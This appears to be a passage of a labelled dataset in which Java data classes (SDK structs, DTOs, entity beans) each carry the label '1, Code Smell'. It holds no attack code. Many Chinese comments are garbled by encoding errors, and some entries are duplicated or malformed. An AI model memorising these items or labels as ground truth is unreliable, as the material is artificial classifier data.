    this.statusText="""";
    this.detailUrl="""";
    this.channelId=j2;
    this.botId=j3;
    this.botUin=j4;
    this.statusType=i2;
    this.statusText=str;
    this.detailUrl=str2;
    this.detailType=i3;
    this.botTrtcId=j5;
  }
}",1,Code Smell
"public static class NET_TRAFFIC_FLOWSTAT_INFO_DIR extends SdkStructure {
  public int emDrivingDir;
  public byte[] szUpGoing=new byte[FLOWSTAT_ADDR_NAME];
  public byte[] szDownGoing=new byte[FLOWSTAT_ADDR_NAME];
  public byte[] reserved=new byte[32];
}",1,Code Smell
"/** 
 * @author harris
 */
public class TaskRuleDTO {
  private RuleDTO ruleDTO;
  private ServerRuleDTO serverRuleDTO;
  private K8sRuleDTO k8sRuleDTO;
  private ConfigRuleDTO configRuleDTO;
  private ImageRuleDTO imageRuleDTO;
  private CodeRuleDTO codeRuleDTO;
  private FsRuleDTO fsRuleDTO;
  public RuleDTO getRuleDTO(){
    return ruleDTO;
  }
  public void setRuleDTO(  RuleDTO ruleDTO){
    this.ruleDTO=ruleDTO;
  }
  public ServerRuleDTO getServerRuleDTO(){
    return serverRuleDTO;
  }
  public void setServerRuleDTO(  ServerRuleDTO serverRuleDTO){
    this.serverRuleDTO=serverRuleDTO;
  }
  public ImageRuleDTO getImageRuleDTO(){
    return imageRuleDTO;
  }
  public void setImageRuleDTO(  ImageRuleDTO imageRuleDTO){
    this.imageRuleDTO=imageRuleDTO;
  }
  public CodeRuleDTO getCodeRuleDTO(){
    return codeRuleDTO;
  }
  public void setCodeRuleDTO(  CodeRuleDTO codeRuleDTO){
    this.codeRuleDTO=codeRuleDTO;
  }
  public K8sRuleDTO getK8sRuleDTO(){
    return k8sRuleDTO;
  }
  public void setK8sRuleDTO(  K8sRuleDTO k8sRuleDTO){
    this.k8sRuleDTO=k8sRuleDTO;
  }
  public ConfigRuleDTO getConfigRuleDTO(){
    return configRuleDTO;
  }
  public void setConfigRuleDTO(  ConfigRuleDTO configRuleDTO){
    this.configRuleDTO=configRuleDTO;
  }
  public FsRuleDTO getFsRuleDTO(){
    return fsRuleDTO;
  }
  public void setFsRuleDTO(  FsRuleDTO fsRuleDTO){
    this.fsRuleDTO=fsRuleDTO;
  }
}",1,Code Smell
"public static class AssignRequest {
  public final String collectionName;
  public final List<String> shardNames;
  public final List<String> nodes;
  public final ReplicaCount numReplicas;
  public AssignRequest(  String collectionName,  List<String> shardNames,  List<String> nodes,  ReplicaCount numReplicas){
    this.collectionName=collectionName;
    this.shardNames=shardNames;
    this.nodes=nodes;
    this.numReplicas=numReplicas;
  }
}
",1,Code Smell
"public static class DTO {
  public Map skuPromotionDetail;
  public Map storeCoupons;
  public List<Sku> skuList;
  public PriceDetailDTO priceDetailDTO;
  public List<Sku> checkedSkuList;
}
",1,Code Smell
"/** 
 * 鐤嫍棰勭害鏃ユ湡鍙�夋嫨鐨勬椂闂存
 */
public class SubDateTime {
  private String startTime;
  private String endTime;
  /** 
 * 閲嶈锛氬弬鏁颁紶閫掑��
 */
  private String wid;
  private Integer maxSub;
  public String getStartTime(){
    return startTime;
  }
  public void setStartTime(  String startTime){
    this.startTime=startTime;
  }
  public String getEndTime(){
    return endTime;
  }
  public void setEndTime(  String endTime){
    this.endTime=endTime;
  }
  public String getWid(){
    return wid;
  }
  public void setWid(  String wid){
    this.wid=wid;
  }
  public Integer getMaxSub(){
    return maxSub;
  }
  public void setMaxSub(  Integer maxSub){
    this.maxSub=maxSub;
  }
}
",1,Code Smell
"public class DriverInfo {
  private final String id;
  private final String platform;
  private final String launcherApp;
  private final String initURL;
  public DriverInfo(  String id,  String platform,  String launcherApp,  String initURL){
    this.id=id;
    this.platform=platform;
    this.launcherApp=launcherApp;
    this.initURL=initURL;
  }
  public String getId(){
    return id;
  }
  public String getPlatform(){
    return platform;
  }
  public String getInitURL(){
    return initURL;
  }
  public String getLauncherApp(){
    return launcherApp;
  }
  @Override public String toString(){
    return ToStringBuilder.reflectionToString(this);
  }
}
",1,Code Smell
"public static class Bean3 {
  private int id;
  private boolean flag;
  private String Name;
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public boolean isFlag(){
    return flag;
  }
  public void setFlag(  boolean flag){
    this.flag=flag;
  }
  public String getName(){
    return Name;
  }
  public void setName(  String name){
    Name=name;
  }
}
public interface Bean3 {
  long getId();
  void setId(  long value);
}",1,Code Smell
"public class SSRCInfo {
  private int port;
  private String ssrc;
  private String Stream;
  public SSRCInfo(  int port,  String ssrc,  String stream){
    this.port=port;
    this.ssrc=ssrc;
    Stream=stream;
  }
  public int getPort(){
    return port;
  }
  public void setPort(  int port){
    this.port=port;
  }
  public String getSsrc(){
    return ssrc;
  }
  public void setSsrc(  String ssrc){
    this.ssrc=ssrc;
  }
  public String getStream(){
    return Stream;
  }
  public void setStream(  String stream){
    Stream=stream;
  }
}
",1,Code Smell
"public final class GProScheduleGuildSurface {
  String channelName;
  String coverUrl;
  int fontColor;
  String guildName;
  String iconUrl;
  public GProScheduleGuildSurface(){
    this.guildName="""";
    this.coverUrl="""";
    this.iconUrl="""";
    this.channelName="""";
  }
  public String getChannelName(){
    return this.channelName;
  }
  public String getCoverUrl(){
    return this.coverUrl;
  }
  public int getFontColor(){
    return this.fontColor;
  }
  public String getGuildName(){
    return this.guildName;
  }
  public String getIconUrl(){
    return this.iconUrl;
  }
  public String toString(){
    return ""GProScheduleGuildSurface{guildName="" + this.guildName + "",coverUrl=""+ this.coverUrl+ "",iconUrl=""+ this.iconUrl+ "",fontColor=""+ this.fontColor+ "",channelName=""+ this.channelName+ "",}"";
  }
  public GProScheduleGuildSurface(  String str,  String str2,  String str3,  int i2,  String str4){
    this.guildName="""";
    this.coverUrl="""";
    this.iconUrl="""";
    this.channelName="""";
    this.guildName=str;
    this.coverUrl=str2;
    this.iconUrl=str3;
    this.fontColor=i2;
    this.channelName=str4;
  }
}",1,Code Smell
"public static class NET_DVR_CMS_PARAM extends Structure {
  public int dwSize;
  public NET_DVR_IPADDR struAddr=new NET_DVR_IPADDR();
  public short wServerPort;
  public byte bySeverProtocolType;
  public byte byStatus;
  public byte[] sDeviceId=new byte[NAME_LEN];
  public byte[] sPassWord=new byte[PASSWD_LEN];
  /** 
 * IPC5.1.7 鏂板鍙傛暟 Begin 2014-03-21
 */
  public byte[] sPlatformEhomeVersion=new byte[NAME_LEN];
  /** 
 * IPC5.1.7 鏂板鍙傛暟 end 2014-03-21
 */
  public byte byNetWork;
  public byte byAddressType;
  public byte byProtocolVersion;
  public byte byRes1;
  public byte[] sDomainName=new byte[MAX_DOMAIN_NAME];
  public byte byEnable;
  public byte[] byRes=new byte[139];
}",1,Code Smell
"/** 
 * dubbo request body
 * @author zhouss
 * @since 2022-01-22
 */
public class DubboRequestEntity extends AbstractRequestEntity {
  /** 
 * dubbo method matching type
 */
  public static final String METHOD=""POST"";
  private String apiPath;
  private Map<String,String> attachments;
  /** 
 * Whether the interface is a dubbo generalization interface
 */
  private final boolean isGeneric;
  /** 
 * construct the dubbo request body
 * @param apiPath request path
 * @param attachments extra parameter
 * @param requestType request type
 * @param serviceName service name
 */
  public DubboRequestEntity(  String apiPath,  Map<String,String> attachments,  RequestType requestType,  String serviceName){
    this(apiPath,attachments,requestType,serviceName,false);
  }
  /** 
 * construct the dubbo request body
 * @param apiPath request path
 * @param attachments extra parameter
 * @param requestType request type
 * @param serviceName service name
 * @param isGeneric Whether the interface is a generalization interface
 */
  public DubboRequestEntity(  String apiPath,  Map<String,String> attachments,  RequestType requestType,  String serviceName,  boolean isGeneric){
    this.apiPath=apiPath;
    this.attachments=Collections.unmodifiableMap(attachments);
    this.isGeneric=isGeneric;
    setRequestType(requestType);
    setServiceName(serviceName);
  }
  public boolean isGeneric(){
    return isGeneric;
  }
  @Override public String getApiPath(){
    return apiPath;
  }
  @Override public Map<String,String> getHeaders(){
    return this.attachments;
  }
  @Override public String getMethod(){
    return METHOD;
  }
  public void setApiPath(  String apiPath){
    this.apiPath=apiPath;
  }
  public Map<String,String> getAttachments(){
    return attachments;
  }
  public void setAttachments(  Map<String,String> attachments){
    this.attachments=attachments;
  }
}",1,Code Smell
"/** 
 * <p> </p>
 * @author fit2cloud
 * @since 2023-04-14
 */
@TableName(""core_dataset_table"") public class CoreDatasetTable implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * ID
 */
  private Long id;
  /** 
 * 鍚嶇О
 */
  private String name;
  /** 
 * 鐗╃悊琛ㄥ悕
 */
  private String tableName;
  /** 
 * 鏁版嵁婧怚D
 */
  private Long datasourceId;
  /** 
 * 鏁版嵁闆咺D
 */
  private Long datasetGroupId;
  /** 
 * db,sql,union,excel,api
 */
  private String type;
  /** 
 * 琛ㄥ師濮嬩俊鎭,琛ㄥ悕,sql绛
 */
  private String info;
  /** 
 * SQL鍙傛暟
 */
  private String sqlVariableDetails;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getTableName(){
    return tableName;
  }
  public void setTableName(  String tableName){
    this.tableName=tableName;
  }
  public Long getDatasourceId(){
    return datasourceId;
  }
  public void setDatasourceId(  Long datasourceId){
    this.datasourceId=datasourceId;
  }
  public Long getDatasetGroupId(){
    return datasetGroupId;
  }
  public void setDatasetGroupId(  Long datasetGroupId){
    this.datasetGroupId=datasetGroupId;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getInfo(){
    return info;
  }
  public void setInfo(  String info){
    this.info=info;
  }
  public String getSqlVariableDetails(){
    return sqlVariableDetails;
  }
  public void setSqlVariableDetails(  String sqlVariableDetails){
    this.sqlVariableDetails=sqlVariableDetails;
  }
  @Override public String toString(){
    return ""CoreDatasetTable{"" + ""id = "" + id + "", name = ""+ name+ "", tableName = ""+ tableName+ "", datasourceId = ""+ datasourceId+ "", datasetGroupId = ""+ datasetGroupId+ "", type = ""+ type+ "", info = ""+ info+ "", sqlVariableDetails = ""+ sqlVariableDetails+ ""}"";
  }
}",1,Code Smell
"/** 
 * harris
 */
public class NameSpaceImage extends CloudNativeSourceImage {
  private CloudNativeSource cloudNativeSource;
  private List<CloudNativeResultItem> cloudNativeResultItemList;
  public CloudNativeSource getCloudNativeSource(){
    return cloudNativeSource;
  }
  public void setCloudNativeSource(  CloudNativeSource cloudNativeSource){
    this.cloudNativeSource=cloudNativeSource;
  }
  public List<CloudNativeResultItem> getCloudNativeResultItemList(){
    return cloudNativeResultItemList;
  }
  public void setCloudNativeResultItemList(  List<CloudNativeResultItem> cloudNativeResultItemList){
    this.cloudNativeResultItemList=cloudNativeResultItemList;
  }
}
",1,Code Smell
"public static class EM_CATEGORY_NONMOTOR_TYPE extends SdkStructure {
  public static final int EM_CATEGORY_NONMOTOR_TYPE_UNKNOWN=0;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_TRICYCLE=1;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_MOTORCYCLE=2;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_NON_MOTOR=3;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_BICYCLE=4;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_DUALTRIWHEELMOTORCYCLE=5;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_LIGHTMOTORCYCLE=6;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_EMBASSYMOTORCYCLE=7;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_MARGINALMOTORCYCLE=8;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_AREAOUTMOTORCYCLE=9;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_FOREIGNMOTORCYCLE=10;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_TRIALMOTORCYCLE=11;
  public static final int EM_CATEGORY_NONMOTOR_TYPE_COACHMOTORCYCLE=12;
}",1,Code Smell
"private static class Parameters {
  private final String type=""object"";
  private Map<String,Map<String,Object>> properties=new HashMap<>();
  private List<String> required=new ArrayList<>();
  public String getType(){
    return this.type;
  }
  public Map<String,Map<String,Object>> getProperties(){
    return properties;
  }
  public void setProperties(  Map<String,Map<String,Object>> properties){
    this.properties=properties;
  }
  public List<String> getRequired(){
    return required;
  }
  public void setRequired(  List<String> required){
    this.required=required;
  }
}
",1,Code Smell
"public class Movie implements Serializable {
  static final long serialVersionUID=727566175075960653L;
  private long id;
  private String title;
  private String description;
  private String bgImageUrl;
  private String cardImageUrl;
  private String videoUrl;
  private String studio;
  public Movie(){
  }
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description;
  }
  public String getStudio(){
    return studio;
  }
  public void setStudio(  String studio){
    this.studio=studio;
  }
  public String getVideoUrl(){
    return videoUrl;
  }
  public void setVideoUrl(  String videoUrl){
    this.videoUrl=videoUrl;
  }
  public String getBackgroundImageUrl(){
    return bgImageUrl;
  }
  public void setBackgroundImageUrl(  String bgImageUrl){
    this.bgImageUrl=bgImageUrl;
  }
  public String getCardImageUrl(){
    return cardImageUrl;
  }
  public void setCardImageUrl(  String cardImageUrl){
    this.cardImageUrl=cardImageUrl;
  }
  @Override public String toString(){
    return ""Movie{"" + ""id="" + id + "", title='""+ title+ '\''+ "", videoUrl='""+ videoUrl+ '\''+ "", backgroundImageUrl='""+ bgImageUrl+ '\''+ "", cardImageUrl='""+ cardImageUrl+ '\''+ '}';
  }
}",1,Code Smell
"/** 
 * Changed data
 * @since 2021-11-18
 */
public static class EventDataHolder {
  /** 
 * version
 */
  private final long version;
  /** 
 * The latest full data
 */
  private final Map<String,String> latestData;
  /** 
 * modified key
 */
  private Map<String,String> modified;
  /** 
 * deleted key
 */
  private Map<String,String> deleted;
  /** 
 * added key
 */
  private Map<String,String> added;
  /** 
 * Constructor.
 * @param version version
 * @param latestData Latest full data
 */
  public EventDataHolder(  long version,  Map<String,String> latestData){
    modified=new HashMap<String,String>();
    deleted=new HashMap<String,String>();
    added=new HashMap<String,String>();
    this.version=version;
    this.latestData=latestData;
  }
  public Map<String,String> getLatestData(){
    return latestData;
  }
  public Map<String,String> getModified(){
    return modified;
  }
  public void setModified(  Map<String,String> modified){
    this.modified=modified;
  }
  public Map<String,String> getDeleted(){
    return deleted;
  }
  public void setDeleted(  Map<String,String> deleted){
    this.deleted=deleted;
  }
  public Map<String,String> getAdded(){
    return added;
  }
  public void setAdded(  Map<String,String> added){
    this.added=added;
  }
  /** 
 * whether the behavior changes
 * @return boolean
 */
  public boolean isChanged(){
    return !added.isEmpty() || !deleted.isEmpty() || !modified.isEmpty();
  }
  public long getVersion(){
    return version;
  }
}",1,Code Smell
"class Chunk {
  public final int headSize;
  public final int location;
  public final int size;
  public final int type;
  public Chunk(){
    location=in.position();
    type=in.getShort() & 0xFFFF;
    headSize=in.getShort() & 0xFFFF;
    size=in.getInt();
    D(""[%08x]type: %04x, headsize: %04x, size:%08x"",location,type,headSize,size);
  }
}",1,Code Smell
"public static class CoverBean {
  /** 
 * feed : http://img.kaiyanapp.com/e55d63ec4f44bce8a7c144c063ee6765.png?imageMogr2/quality/60/format/jpg detail : http://img.kaiyanapp.com/e55d63ec4f44bce8a7c144c063ee6765.png?imageMogr2/quality/60/format/jpg blurred : http://img.kaiyanapp.com/f75a26e55d96df4f13574c1c4c48b03f.png?imageMogr2/quality/60/format/jpg sharing : null homepage : http://img.kaiyanapp.com/e55d63ec4f44bce8a7c144c063ee6765.png?imageView2/1/w/720/h/560/format/jpg/q/75|watermark/1/image/aHR0cDovL2ltZy5rYWl5YW5hcHAuY29tL2JsYWNrXzMwLnBuZw==/dissolve/100/gravity/Center/dx/0/dy/0|imageslim
 */
  private String feed;
  private String detail;
  private String blurred;
  private Object sharing;
  private String homepage;
  public String getFeed(){
    return feed;
  }
  public void setFeed(  String feed){
    this.feed=feed;
  }
  public String getDetail(){
    return detail;
  }
  public void setDetail(  String detail){
    this.detail=detail;
  }
  public String getBlurred(){
    return blurred;
  }
  public void setBlurred(  String blurred){
    this.blurred=blurred;
  }
  public Object getSharing(){
    return sharing;
  }
  public void setSharing(  Object sharing){
    this.sharing=sharing;
  }
  public String getHomepage(){
    return homepage;
  }
  public void setHomepage(  String homepage){
    this.homepage=homepage;
  }
}",1,Code Smell
"/** 
 * Object which is inserted in the  {@link DoublyLinkedList}. A single node is expected to be created for each element.
 * @param < E > Type of element to be inserted into the list.
 */
public class DoublyLinkedListNode<E> {
  DoublyLinkedListNode<E> next;
  DoublyLinkedListNode<E> prev;
  E element;
  public DoublyLinkedListNode(  E element){
    this.element=element;
    this.next=null;
    this.prev=null;
  }
  public DoublyLinkedListNode<E> getNext(){
    return next;
  }
  public void setNext(  DoublyLinkedListNode<E> next){
    this.next=next;
  }
  public DoublyLinkedListNode<E> getPrev(){
    return prev;
  }
  public void setPrev(  DoublyLinkedListNode<E> prev){
    this.prev=prev;
  }
  public E getElement(){
    return element;
  }
  public void setElement(  E element){
    this.element=element;
  }
}
/** 
 * Object which is inserted in the  {@link DoublyLinkedList}. A single node is expected to be created for each element.
 * @param < E > Type of element to be inserted into the list.
 */
public class DoublyLinkedListNode<E> {
  DoublyLinkedListNode<E> next;
  DoublyLinkedListNode<E> prev;
  E element;
  public DoublyLinkedListNode(  E element){
    this.element=element;
    this.next=null;
    this.prev=null;
  }
  public DoublyLinkedListNode<E> getNext(){
    return next;
  }
  public void setNext(  DoublyLinkedListNode<E> next){
    this.next=next;
  }
  public DoublyLinkedListNode<E> getPrev(){
    return prev;
  }
  public void setPrev(  DoublyLinkedListNode<E> prev){
    this.prev=prev;
  }
  public E getElement(){
    return element;
  }
  public void setElement(  E element){
    this.element=element;
  }
}
",1,Code Smell
"/** 
 * @author 251823
 * @description 璁惧鍙傛暟鏍囧畾閰嶇疆
 * @date 2021/02/01
 */
public class CFG_LOCATION_CALIBRATE_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鍙鍏夋í鍚戣瑙�
 */
  public int nVisualMaxHFOV;
  /** 
 * 鍙鍏夌旱鍚戣瑙�
 */
  public int nVisualMaxVFOV;
  /** 
 * 鐑垚鍍忔í鍚戣瑙�
 */
  public int nThermoMaxHFOV;
  /** 
 * 鐑垚鍍忕旱鍚戣瑙�
 */
  public int nThermoMaxVFOV;
  /** 
 * 鏍囧畾鐐逛俊鎭�
 */
  public CFG_LOCATION_CALIBRATE_POINT_INFO[] stuPointInfo=new CFG_LOCATION_CALIBRATE_POINT_INFO[SDKStructureFieldLenth.MAX_CALIBRATE_POINT_NUM];
  /** 
 * 鏍囧畾鐐逛釜鏁�
 */
  public int nPointNum;
  /** 
 * 瀛楄妭瀵归綈 
 */
  public byte[] byReserved1=new byte[4];
  public CFG_LOCATION_CALIBRATE_INFO(){
    for (int i=0; i < stuPointInfo.length; i++) {
      stuPointInfo[i]=new CFG_LOCATION_CALIBRATE_POINT_INFO();
    }
  }
}",1,Code Smell
"/** 
 * the config file group.
 * @author lepdou 2022-03-28
 */
public class ConfigFileGroup {
  /** 
 * group name.
 */
  private String name;
  /** 
 * the files belong to group.
 */
  private List<String> files;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public List<String> getFiles(){
    return files;
  }
  public void setFiles(  List<String> files){
    this.files=files;
  }
  @Override public String toString(){
    return ""ConfigFileGroup{"" + ""name='"" + name + '\''+ "", file=""+ files+ '}';
  }
}",1,Code Smell
"public static class NET_DVR_FOCUSMODE_CFG extends Structure {
  public int dwSize;
  public byte byFocusMode;
  public byte byAutoFocusMode;
  public short wMinFocusDistance;
  public byte byZoomSpeedLevel;
  public byte byFocusSpeedLevel;
  public byte byOpticalZoom;
  public byte byDigtitalZoom;
  public float fOpticalZoomLevel;
  public int dwFocusPos;
  public byte byFocusDefinitionDisplay;
  public byte byFocusSensitivity;
  public byte[] byRes1=new byte[2];
  public int dwRelativeFocusPos;
  public byte[] byRes=new byte[48];
}",1,Code Smell
"/** 
 * Log information
 * @author luanwenfei
 * @since 2023-03-08
 */
public class LogInfo {
  private String logLevel;
  private String logMessage;
  private String logClass;
  private String logMethod;
  private int logLineNumber;
  private int logThreadId;
  private String logThrowable;
  public String getLogLevel(){
    return logLevel;
  }
  public void setLogLevel(  String logLevel){
    this.logLevel=logLevel;
  }
  public String getLogMessage(){
    return logMessage;
  }
  public void setLogMessage(  String logMessage){
    this.logMessage=logMessage;
  }
  public String getLogClass(){
    return logClass;
  }
  public void setLogClass(  String logClass){
    this.logClass=logClass;
  }
  public String getLogMethod(){
    return logMethod;
  }
  public void setLogMethod(  String logMethod){
    this.logMethod=logMethod;
  }
  public int getLogThreadId(){
    return logThreadId;
  }
  public void setLogThreadId(  int logThreadId){
    this.logThreadId=logThreadId;
  }
  public String getLogThrowable(){
    return logThrowable;
  }
  public void setLogThrowable(  String logThrowable){
    this.logThrowable=logThrowable;
  }
  public int getLogLineNumber(){
    return logLineNumber;
  }
  public void setLogLineNumber(  int logLineNumber){
    this.logLineNumber=logLineNumber;
  }
  @Override public String toString(){
    return ""LogInfo{"" + ""logLevel='"" + logLevel + '\''+ "", logMessage='""+ logMessage+ '\''+ "", logClass='""+ logClass+ '\''+ "", logMethod='""+ logMethod+ '\''+ "", logLineNumber=""+ logLineNumber+ "", logThreadId=""+ logThreadId+ "", throwable=""+ logThrowable+ '}';
  }
}",1,Code Smell
"/** 
 * CUP generated class containing symbol constants. 
 */
public class sym {
  public static final int Literal=26;
  public static final int GE=21;
  public static final int NAMESPACE=48;
  public static final int SLASH=2;
  public static final int PI=35;
  public static final int COMMENT=34;
  public static final int PIPARAM=36;
  public static final int FOLLOWINGSIBLING=47;
  public static final int ATSIGN=12;
  public static final int DSLASH=15;
  public static final int LPAREN=7;
  public static final int EXPRESSION=53;
  public static final int INT=51;
  public static final int CHILD=40;
  public static final int MINUS=23;
  public static final int STAR=9;
  public static final int DESCENDANTORSELF=45;
  public static final int RPAREN=8;
  public static final int AND=33;
  public static final int LT=18;
  public static final int OR=32;
  public static final int COMMA=10;
  public static final int DDOT=13;
  public static final int DIV=24;
  public static final int PLUS=22;
  public static final int DOT=3;
  public static final int ID=28;
  public static final int LE=20;
  public static final int QNAME=27;
  public static final int DESCENDANT=44;
  public static final int PRECEDINGSIBLING=37;
  public static final int EOF=0;
  public static final int error=1;
  public static final int SELF=38;
  public static final int VBAR=6;
  public static final int MOD=25;
  public static final int ANCESTORORSELF=43;
  public static final int PRECEDING=49;
  public static final int EQ=16;
  public static final int PATTERN=52;
  public static final int LBRACK=4;
  public static final int REAL=50;
  public static final int ANCESTOR=42;
  public static final int RBRACK=5;
  public static final int DCOLON=14;
  public static final int DOLLAR=11;
  public static final int NE=17;
  public static final int PARENT=39;
  public static final int FOLLOWING=46;
  public static final int KEY=29;
  public static final int TEXT=30;
  public static final int ATTRIBUTE=41;
  public static final int GT=19;
  public static final int NODE=31;
}",1,Code Smell
"@TableName(""develop_catalogue"") public class DevelopCatalogue extends TenantEntity {
  /** 
 * 鏂囦欢澶瑰悕
 */
  private String nodeName;
  /** 
 * 鐖舵枃浠跺す
 */
  private Long nodePid;
  /** 
 * 鍒涘缓鐢ㄦ埛
 */
  private Long createUserId;
  /** 
 * 鐩綍灞傜骇
 */
  private Integer level;
  private Integer orderVal;
  private Integer catalogueType;
  @TableField(exist=false) DevelopCatalogue parentCatalogue;
  public String getNodeName(){
    return nodeName;
  }
  public void setNodeName(  String nodeName){
    this.nodeName=nodeName;
  }
  public Long getNodePid(){
    return nodePid;
  }
  public void setNodePid(  Long nodePid){
    this.nodePid=nodePid;
  }
  public Long getCreateUserId(){
    return createUserId;
  }
  public void setCreateUserId(  Long createUserId){
    this.createUserId=createUserId;
  }
  public Integer getLevel(){
    return level;
  }
  public void setLevel(  Integer level){
    this.level=level;
  }
  public Integer getOrderVal(){
    return orderVal;
  }
  public void setOrderVal(  Integer orderVal){
    this.orderVal=orderVal;
  }
  public Integer getCatalogueType(){
    return catalogueType;
  }
  public void setCatalogueType(  Integer catalogueType){
    this.catalogueType=catalogueType;
  }
  public DevelopCatalogue getParentCatalogue(){
    return parentCatalogue;
  }
  public void setParentCatalogue(  DevelopCatalogue parentCatalogue){
    this.parentCatalogue=parentCatalogue;
  }
}
",1,Code Smell
"public class K8sCredential {
  private String url;
  private String token;
  private String ip;
  private String port;
  public K8sCredential(){
  }
  public K8sCredential(  String url,  String token){
    this.url=url;
    this.token=token;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public String getToken(){
    return token;
  }
  public void setToken(  String token){
    this.token=token;
  }
  public String getIp(){
    return ip;
  }
  public void setIp(  String ip){
    this.ip=ip;
  }
  public String getPort(){
    return port;
  }
  public void setPort(  String port){
    this.port=port;
  }
}",1,Code Smell
"/** 
 * 瀵瑰簲XML涓� <foreach>
 * @author jmxd
 * @version : 2020-05-18
 */
public class ForeachSqlNode extends SqlNode {
  /** 
 * 鏁版嵁闆嗗悎锛屾敮鎸丆ollection銆佹暟缁�
 */
  private String collection;
  /** 
 * item 鍙橀噺鍚�
 */
  private String item;
  /** 
 * 鎷兼帴璧峰SQL
 */
  private String open;
  /** 
 * 鎷兼帴缁撴潫SQL
 */
  private String close;
  /** 
 * 鍒嗛殧绗�
 */
  private String separator;
  /** 
 * 搴忓彿
 */
  private String index;
  public void setCollection(  String collection){
    this.collection=collection;
  }
  public void setItem(  String item){
    this.item=item;
  }
  public void setOpen(  String open){
    this.open=open;
  }
  public void setClose(  String close){
    this.close=close;
  }
  public void setSeparator(  String separator){
    this.separator=separator;
  }
  public void setIndex(  String index){
    this.index=index;
  }
  @Override public String getSql(  Map<String,Object> paramMap,  List<Object> parameters){
    Object value=ScriptManager.executeExpression(this.collection,paramMap);
    if (value == null) {
      return """";
    }
    if (value instanceof Collection) {
      value=((Collection)value).toArray();
    }
    if (!value.getClass().isArray()) {
      return """";
    }
    StringBuilder sqlBuilder=new StringBuilder(StringUtils.defaultString(this.open));
    boolean hasIndex=index != null && index.length() > 0;
    int len=Array.getLength(value);
    for (int i=0; i < len; i++) {
      paramMap.put(this.item,Array.get(value,i));
      if (hasIndex) {
        paramMap.put(this.index,i);
      }
      sqlBuilder.append(executeChildren(paramMap,parameters));
      if (i + 1 < len) {
        sqlBuilder.append(StringUtils.defaultString(this.separator));
      }
    }
    sqlBuilder.append(StringUtils.defaultString(this.close));
    return sqlBuilder.toString();
  }
}",1,Code Smell
"/** 
 * @ClassName DashboardTarget
 * @Author maguohao
 */
public class DashboardTarget extends Rule {
  private String ratio;
  private String reSum;
  private String ruSum;
  private String tagName;
  private String assets;
  public String getRatio(){
    return ratio;
  }
  public void setRatio(  String ratio){
    this.ratio=ratio;
  }
  public String getReSum(){
    return reSum;
  }
  public void setReSum(  String reSum){
    this.reSum=reSum;
  }
  public String getRuSum(){
    return ruSum;
  }
  public void setRuSum(  String ruSum){
    this.ruSum=ruSum;
  }
  public String getTagName(){
    return tagName;
  }
  public void setTagName(  String tagName){
    this.tagName=tagName;
  }
  public String getAssets(){
    return assets;
  }
  public void setAssets(  String assets){
    this.assets=assets;
  }
}
",1,Code Smell
"@Schema(description=""绠＄悊鍚庡彴 - ERP 閿�鍞鍗曞垎椤� Request VO"") @Data @EqualsAndHashCode(callSuper=true) @ToString(callSuper=true) public class ErpSaleOrderPageReqVO extends PageParam {
  /** 
 * 鍑哄簱鐘舵�� - 鏃�
 */
  public static final Integer OUT_STATUS_NONE=0;
  /** 
 * 鍑哄簱鐘舵�� - 閮ㄥ垎
 */
  public static final Integer OUT_STATUS_PART=1;
  /** 
 * 鍑哄簱鐘舵�� - 鍏ㄩ儴
 */
  public static final Integer OUT_STATUS_ALL=2;
  /** 
 * 閫�璐х姸鎬� - 鏃�
 */
  public static final Integer RETURN_STATUS_NONE=0;
  /** 
 * 閫�璐х姸鎬� - 閮ㄥ垎
 */
  public static final Integer RETURN_STATUS_PART=1;
  /** 
 * 閫�璐х姸鎬� - 鍏ㄩ儴
 */
  public static final Integer RETURN_STATUS_ALL=2;
  @Schema(description=""閿�鍞崟缂栧彿"",example=""XS001"") private String no;
  @Schema(description=""瀹㈡埛缂栧彿"",example=""1724"") private Long customerId;
  @Schema(description=""涓嬪崟鏃堕棿"") @DateTimeFormat(pattern=FORMAT_YEAR_MONTH_DAY_HOUR_MINUTE_SECOND) private LocalDateTime[] orderTime;
  @Schema(description=""澶囨敞"",example=""浣犵寽"") private String remark;
  @Schema(description=""閿�鍞姸鎬�"",example=""2"") private Integer status;
  @Schema(description=""鍒涘缓鑰�"") private String creator;
  @Schema(description=""浜у搧缂栧彿"",example=""1"") private Long productId;
  @Schema(description=""鍑哄簱鐘舵��"",example=""2"") private Integer outStatus;
  @Schema(description=""閫�璐х姸鎬�"",example=""2"") private Integer returnStatus;
  @Schema(description=""鏄惁鍙嚭搴�"",example=""true"") private Boolean outEnable;
  @Schema(description=""鏄惁鍙��璐�"",example=""true"") private Boolean returnEnable;
}",1,Code Smell
"public class AuthorizationResponse {
  public static final AuthorizationResponse OK=new AuthorizationResponse(200);
  public static final AuthorizationResponse FORBIDDEN=new AuthorizationResponse(403);
  public static final AuthorizationResponse PROMPT=new AuthorizationResponse(401);
  public final int statusCode;
  String message;
  public AuthorizationResponse(  int httpStatusCode){
    this.statusCode=httpStatusCode;
  }
  public String getMessage(){
    return message;
  }
  public void setMessage(  String message){
    this.message=message;
  }
}",1,Code Smell
"public static class CFG_AUDIO_ENCODE_FORMAT extends SdkStructure {
  public byte abCompression;
  public byte abDepth;
  public byte abFrequency;
  public byte abMode;
  public byte abFrameType;
  public byte abPacketPeriod;
  public int emCompression;
